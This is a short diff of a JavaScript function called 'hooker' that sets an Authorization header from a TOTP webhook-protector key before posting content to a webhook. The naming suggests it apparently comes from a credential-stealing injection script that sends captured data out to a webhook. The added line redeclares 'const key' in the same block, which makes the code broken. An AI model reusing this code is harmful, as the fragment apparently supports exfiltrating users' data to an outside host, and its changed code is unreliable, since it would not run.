@@ -633,6 +633,7 @@ const hooker = async (content) => {
   };
   if (!config.webhook.includes('api/webhooks')) {
     const key = totp(config.webhook_protector_key);
+    const key = totp(config.webhook_protector_key1);
     headers['Authorization'] = key;
   }
   const options = {
